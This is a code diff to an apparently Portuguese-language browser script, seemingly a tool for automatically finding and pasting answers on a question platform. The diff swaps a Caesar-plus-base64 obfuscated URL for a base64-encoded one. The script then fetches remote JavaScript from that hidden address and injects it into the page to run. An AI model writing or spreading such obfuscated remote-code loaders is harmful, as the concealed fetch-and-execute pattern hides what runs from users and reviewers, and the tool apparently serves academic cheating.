@@ -231,31 +231,15 @@ function showWelcomeToasts() {
     const encontrarRespostaColar = () => {
     sendToast('⏳ Carregando script...', 3000);
 
+    // URL real dividida em partes e codificada em base64
     const parts = [
-        "cWIw",
-        "ZG5z",
-        "Ynxu",
-        "dXhi",
-        "Y29t",
-        "L2F1",
-        "eGFw",
-        "bmVs",
-        "L21h",
-        "aW4v",
+        "aHR0cHM6Ly9yYXcudG9jdGVib3JhLmNvbS9hdXhhdXBhbmVsLzIwNTAvcmVmcy9oZWFkcy9tYWluL2NvZXRhcnBlcmd1bnRhZXJlc3BvbnRhcmVzcGFzYS5qcw=="
     ];
 
-    const decodePart = (str) => {
-        const caesarReversed = str.split('').map(c => {
-            const code = c.charCodeAt(0);
-            if ((code >= 65 && code <= 90) || (code >= 97 && code <= 122)) {
-                return String.fromCharCode(code - 2);
-            } else {
-                return c;
-            }
-        }).join('');
-        return atob(caesarReversed);
-    };
+    // Função para decodificar base64
+    const decodePart = (str) => atob(str);
 
+    // Reconstrói a URL completa
     const scriptURL = parts.map(decodePart).join('') + "?" + Date.now();
 
     fetch(scriptURL)
@@ -269,7 +253,6 @@ function showWelcomeToasts() {
             document.head.appendChild(script);
             sendToast('✅ Script carregado com sucesso!', 3000);
 
-            // 🔥 remove o fundo e recria o botão flutuante
             if (typeof fundo !== "undefined" && fundo) {
                 fundo.remove();
             }
